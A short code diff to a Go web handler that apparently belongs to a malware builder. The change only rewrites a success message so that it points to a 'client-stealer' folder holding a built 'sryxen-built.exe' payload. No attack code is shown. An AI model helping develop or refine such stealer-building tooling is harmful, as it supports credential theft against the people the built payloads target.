@@ -61,7 +61,7 @@ func HandleBuilderForm(w http.ResponseWriter, r *http.Request) {
     }
 
     w.WriteHeader(http.StatusOK)
-    w.Write([]byte("Payload generated successfully!"))
+    w.Write([]byte("Payload generated successfully! please check folder called client-stealer theres a payload called sryxen-built.exe which is yours."))
 }
 
 
